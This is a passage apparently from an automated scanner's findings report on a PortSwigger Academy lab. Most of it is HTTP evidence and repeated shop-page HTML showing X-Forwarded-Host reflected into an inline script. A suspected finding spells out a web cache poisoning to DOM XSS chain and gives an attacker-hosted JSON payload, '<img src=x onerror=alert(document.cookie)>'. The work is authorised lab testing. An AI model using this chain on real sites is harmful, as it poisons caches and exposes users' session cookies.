                            <h3>Six Pack Beer Belt</h3>
                            <img src="/resources/images/rating5.png">
                            $74.75
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/27.jpg">
                            <h3>The Trolley-ON</h3>
                            <img src="/resources/images/rating1.png">
                            $55.99
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/64.jpg">
                            <h3>Hexbug Battleground Tarantula Double Pack</h3>
                            <img src="/resources/images/rating2.png">
                            $53.83
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating1.png">
                            $69.65
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/57.jpg">
                            <h3>Lightbulb Moments</h3>
                            <img src="/resources/images/rating5.png">
                            $46.31
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/5.jpg">
                            <h3>Cheshire Cat Grin</h3>
                            <img src="/resources/images/rating5.png">
                            $38.41
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/12.jpg">
```

- Evidence `ev-mr61tyvx-36` — `artifacts/_/ev-mr61tyvx-36/`

Request:

```http
GET /?cb=ctrl-9f3a HTTP/1.1
Host: 0a1d009a03d75453819093a800cc00d1.web-security-academy.net
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 200
cache-control: no-cache
connection: close
content-encoding: gzip
content-length: 2336
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <script>
            data = {"host":"0a1d009a03d75453819093a800cc00d1.web-security-academy.net","path":"/"}
        </script>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script type="text/javascript" src="/resources/js/geolocate.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0ade00f003df548e813c92c101a20056.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1kZXNpZ24tZmxhd3MvbGFiLXdlYi1jYWNoZS1wb2lzb25pbmctdG8tZXhwbG9pdC1hLWRvbS12dWxuZXJhYmlsaXR5LXZpYS1hLWNhY2hlLXdpdGgtc3RyaWN0LWNhY2hlYWJpbGl0eS1jcml0ZXJpYQ=='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <div id=shipping-info class=shipping-info>
                        </div>
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/40.jpg">
                            <h3>Sarcastic 9 Ball</h3>
                            <img src="/resources/images/rating2.png">
                            $98.00
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating2.png">
                            $82.92
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/47.jpg">
                            <h3>3D Voice Assistants</h3>
                            <img src="/resources/images/rating5.png">
                            $73.51
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/38.jpg">
                            <h3>Six Pack Beer Belt</h3>
                            <img src="/resources/images/rating5.png">
                            $74.75
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/27.jpg">
                            <h3>The Trolley-ON</h3>
                            <img src="/resources/images/rating1.png">
                            $55.99
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/64.jpg">
                            <h3>Hexbug Battleground Tarantula Double Pack</h3>
                            <img src="/resources/images/rating2.png">
                            $53.83
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating1.png">
                            $69.65
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/57.jpg">
                            <h3>Lightbulb Moments</h3>
                            <img src="/resources/images/rating5.png">
                            $46.31
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/5.jpg">
                            <h3>Cheshire Cat Grin</h3>
                            <img src="/resources/images/rating5.png">
                            $38.41
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/12.jpg">
                            <h3>Hologram Stand In</h3>
                            <img src="/resources/images/rating4.png">
                            $94.96
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/13.jpg">
                            <h3>Inflatable Dartboard</h3>
                            <img src="/resources/images/rating4.png">
                            $66.51
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating4.png">
                            $68.79
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/54.jpg">
                            <h3>Robot Home Security Buddy</h3>
                            <img src="/resources/images/rating1.png">
                            $93.40
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/30.jpg">
                            <h3>Giant Pillow Thing</h3>
                            <img src="/resources/images/rating1.png">
                            $48.88
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/72.jpg">
                            <h3>Baby Minding Shoes</h3>
                            <img src="/resources/images/rating1.png">
                            $21.42
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/62.jpg">
                            <h3>Weird Crushes Game</h3>
                            <img src="/resources/images/rating1.png">
                            $33.47
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating5.png">
                            $70.95
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/70.jpg">
                            <h3>Eye Projectors</h3>
                            <img src="/resources/images/rating1.png">
                            $12.02
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/45.jpg">
                            <h3>ZZZZZZ Bed - Your New Home Office</h3>
                            <img src="/resources/images/rating3.png">
                            $29.77
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/18.jpg">
                            <h3>Portable Hat</h3>
                            <img src="/resources/images/rating4.png">
                            $58.70
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                    <script>
                        initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
                    </script>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr61u26p-37` — `artifacts/_/ev-mr61u26p-37/`

Request:

```http
GET /?cb=pos1-7b21 HTTP/1.1
Host: 0a1d009a03d75453819093a800cc00d1.web-security-academy.net
user-agent: verdict-scanner/0.1
X-Forwarded-Host: veritas-marker-a1.example.com
```

Response:

```http
HTTP/1.1 200
cache-control: no-cache
connection: close
content-encoding: gzip
content-length: 2321
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <script>
            data = {"host":"veritas-marker-a1.example.com","path":"/"}
        </script>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script type="text/javascript" src="/resources/js/geolocate.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0ade00f003df548e813c92c101a20056.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1kZXNpZ24tZmxhd3MvbGFiLXdlYi1jYWNoZS1wb2lzb25pbmctdG8tZXhwbG9pdC1hLWRvbS12dWxuZXJhYmlsaXR5LXZpYS1hLWNhY2hlLXdpdGgtc3RyaWN0LWNhY2hlYWJpbGl0eS1jcml0ZXJpYQ=='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <div id=shipping-info class=shipping-info>
                        </div>
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/40.jpg">
                            <h3>Sarcastic 9 Ball</h3>
                            <img src="/resources/images/rating2.png">
                            $98.00
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating2.png">
                            $82.92
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/47.jpg">
                            <h3>3D Voice Assistants</h3>
                            <img src="/resources/images/rating5.png">
                            $73.51
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/38.jpg">
                            <h3>Six Pack Beer Belt</h3>
                            <img src="/resources/images/rating5.png">
                            $74.75
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/27.jpg">
                            <h3>The Trolley-ON</h3>
                            <img src="/resources/images/rating1.png">
                            $55.99
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/64.jpg">
                            <h3>Hexbug Battleground Tarantula Double Pack</h3>
                            <img src="/resources/images/rating2.png">
                            $53.83
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating1.png">
                            $69.65
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/57.jpg">
                            <h3>Lightbulb Moments</h3>
                            <img src="/resources/images/rating5.png">
                            $46.31
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/5.jpg">
                            <h3>Cheshire Cat Grin</h3>
                            <img src="/resources/images/rating5.png">
                            $38.41
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/12.jpg">
                            <h3>Hologram Stand In</h3>
                            <img src="/resources/images/rating4.png">
                            $94.96
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/13.jpg">
                            <h3>Inflatable Dartboard</h3>
                            <img src="/resources/images/rating4.png">
                            $66.51
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating4.png">
                            $68.79
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/54.jpg">
                            <h3>Robot Home Security Buddy</h3>
                            <img src="/resources/images/rating1.png">
                            $93.40
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/30.jpg">
                            <h3>Giant Pillow Thing</h3>
                            <img src="/resources/images/rating1.png">
                            $48.88
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/72.jpg">
                            <h3>Baby Minding Shoes</h3>
                            <img src="/resources/images/rating1.png">
                            $21.42
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/62.jpg">
                            <h3>Weird Crushes Game</h3>
                            <img src="/resources/images/rating1.png">
                            $33.47
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating5.png">
                            $70.95
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/70.jpg">
                            <h3>Eye Projectors</h3>
                            <img src="/resources/images/rating1.png">
                            $12.02
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/45.jpg">
                            <h3>ZZZZZZ Bed - Your New Home Office</h3>
                            <img src="/resources/images/rating3.png">
                            $29.77
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/18.jpg">
                            <h3>Portable Hat</h3>
                            <img src="/resources/images/rating4.png">
                            $58.70
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                    <script>
                        initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
                    </script>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr61u5i6-38` — `artifacts/_/ev-mr61u5i6-38/`

Request:

```http
GET /?cb=pos2-c4e8 HTTP/1.1
Host: 0a1d009a03d75453819093a800cc00d1.web-security-academy.net
user-agent: verdict-scanner/0.1
X-Forwarded-Host: veritas-marker-b2.example.com
```

Response:

```http
HTTP/1.1 200
cache-control: no-cache
connection: close
content-encoding: gzip
content-length: 2321
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <script>
            data = {"host":"veritas-marker-b2.example.com","path":"/"}
        </script>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script type="text/javascript" src="/resources/js/geolocate.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0ade00f003df548e813c92c101a20056.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1kZXNpZ24tZmxhd3MvbGFiLXdlYi1jYWNoZS1wb2lzb25pbmctdG8tZXhwbG9pdC1hLWRvbS12dWxuZXJhYmlsaXR5LXZpYS1hLWNhY2hlLXdpdGgtc3RyaWN0LWNhY2hlYWJpbGl0eS1jcml0ZXJpYQ=='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <div id=shipping-info class=shipping-info>
                        </div>
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/40.jpg">
                            <h3>Sarcastic 9 Ball</h3>
                            <img src="/resources/images/rating2.png">
                            $98.00
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating2.png">
                            $82.92
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/47.jpg">
                            <h3>3D Voice Assistants</h3>
                            <img src="/resources/images/rating5.png">
                            $73.51
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/38.jpg">
                            <h3>Six Pack Beer Belt</h3>
                            <img src="/resources/images/rating5.png">
                            $74.75
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/27.jpg">
                            <h3>The Trolley-ON</h3>
                            <img src="/resources/images/rating1.png">
                            $55.99
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/64.jpg">
                            <h3>Hexbug Battleground Tarantula Double Pack</h3>
                            <img src="/resources/images/rating2.png">
                            $53.83
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating1.png">
                            $69.65
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/57.jpg">
                            <h3>Lightbulb Moments</h3>
                            <img src="/resources/images/rating5.png">
                            $46.31
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/5.jpg">
                            <h3>Cheshire Cat Grin</h3>
                            <img src="/resources/images/rating5.png">
                            $38.41
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/12.jpg">
                            <h3>Hologram Stand In</h3>
                            <img src="/resources/images/rating4.png">
                            $94.96
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/13.jpg">
                            <h3>Inflatable Dartboard</h3>
                            <img src="/resources/images/rating4.png">
                            $66.51
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating4.png">
                            $68.79
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/54.jpg">
                            <h3>Robot Home Security Buddy</h3>
                            <img src="/resources/images/rating1.png">
                            $93.40
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/30.jpg">
                            <h3>Giant Pillow Thing</h3>
                            <img src="/resources/images/rating1.png">
                            $48.88
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/72.jpg">
                            <h3>Baby Minding Shoes</h3>
                            <img src="/resources/images/rating1.png">
                            $21.42
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/62.jpg">
                            <h3>Weird Crushes Game</h3>
                            <img src="/resources/images/rating1.png">
                            $33.47
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating5.png">
                            $70.95
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/70.jpg">
                            <h3>Eye Projectors</h3>
                            <img src="/resources/images/rating1.png">
                            $12.02
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/45.jpg">
                            <h3>ZZZZZZ Bed - Your New Home Office</h3>
                            <img src="/resources/images/rating3.png">
                            $29.77
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/18.jpg">
                            <h3>Portable Hat</h3>
                            <img src="/resources/images/rating4.png">
                            $58.70
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                    <script>
                        initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
                    </script>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

## Suspected (needs manual verification)

_Leads with one concrete observed anomaly but without control+2-replay confirmation. NOT counted in the confirmed total above — verify before relying on them._

<a id="finding-6"></a>

### 6. [SUSPECTED] [HIGH] [xss-stored] DOM XSS via unkeyed X-Forwarded-Host rewriting the geolocate JSON fetch origin (web cache poisoning)

- Screen: `s-0003`
- Source: validator `claude-pilot`
- Scope basis: authorized target https://0a1d009a03d75453819093a800cc00d1.web-security-academy.net/

**Anomaly (why this is a lead):** The unkeyed X-Forwarded-Host request header is reflected verbatim into an inline script as data={"host":"<attacker>","path":"/product"}. /resources/js/geolocate.js builds its fetch(jsonUrl) URL from that host and writes the JSON's "country" field into div.innerHTML ('Free shipping to '+j.country). So an attacker host in X-Forwarded-Host makes the victim browser fetch attacker-controlled JSON, whose country value executes via innerHTML — a DOM XSS delivered to all users through web cache poisoning. Reflection confirmed with control(no header→legit host)+2 replays(evil host); only end-to-end execution (needs attacker-hosted geolocate.json on the out-of-scope exploit server) was not fired in-harness.

The product page emits an inline script `data = {"host":"<X-Forwarded-Host>","path":"/product"}`. The X-Forwarded-Host request header is UNKEYED and reflected directly into `data.host` (a clean hostname reflects unescaped; only script-metacharacters are JSON-escaped, so a direct script breakout is blocked). The client script `/resources/js/geolocate.js` (`initGeoLocate(jsonUrl)`) fetches `jsonUrl` (built from `data.host`), parses the JSON and executes `div.innerHTML = 'Free shipping to ' + j.country`. Because `data.host` is attacker-controllable, the browser can be steered to fetch a JSON document from an attacker origin whose `country` field carries an HTML/JS payload, which is then injected via innerHTML => DOM-based XSS. Delivered to arbitrary users via web cache poisoning of the unkeyed header (PortSwigger "web cache poisoning to exploit a DOM vulnerability"). Impact: XSS in the security context of all users viewing the poisoned page. Not marked confirmed because firing the payload requires hosting the malicious geolocate.json on the exploit server (out of scope) and landing a cache poison — neither reachable with the available probes; the header->sink-URL primitive itself is reproducibly confirmed.

**Reproduction**

```
1) GET /product?productId=1 with header `X-Forwarded-Host: evil-verdict-test.com` → response inline script becomes `data = {"host":"evil-verdict-test.com","path":"/product"}` (ev-mr60n1q2-1s, ev-mr60na9d-1u). 2) GET same with no header → `data.host` stays the legit lab host (ev-mr60br49-19) — negative control. 3) Source: /resources/js/geolocate.js does `fetch(jsonUrl).then(r=>r.json()).then(j=>{div.innerHTML='Free shipping to '+j.country})` (ev-mr60c4rb-1b). 4) Full exploit: poison the cache with `X-Forwarded-Host: exploit-<id>.exploit-server.net` (ev-mr60ogy3-1w) hosting /resources/json/geolocate.json returning `{"country":"<img src=x onerror=alert(document.cookie)>"}` with permissive CORS; victims loading the cached page fetch attacker JSON and execute it via innerHTML.
```

**Evidence**

- Evidence `ev-mr60ogy3-1w` — `artifacts/s-0003/ev-mr60ogy3-1w/`

Request:

```http
GET /product?productId=1 HTTP/1.1
Host: 0a1d009a03d75453819093a800cc00d1.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
X-Forwarded-Host: exploit-0ade00f003df548e813c92c101a20056.exploit-server.net
```

Response:

```http
HTTP/1.1 200
cache-control: no-cache
content-length: 5712
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <script>
            data = {"host":"exploit-0ade00f003df548e813c92c101a20056.exploit-server.net","path":"/product"}
        </script>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script type="text/javascript" src="/resources/js/geolocate.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
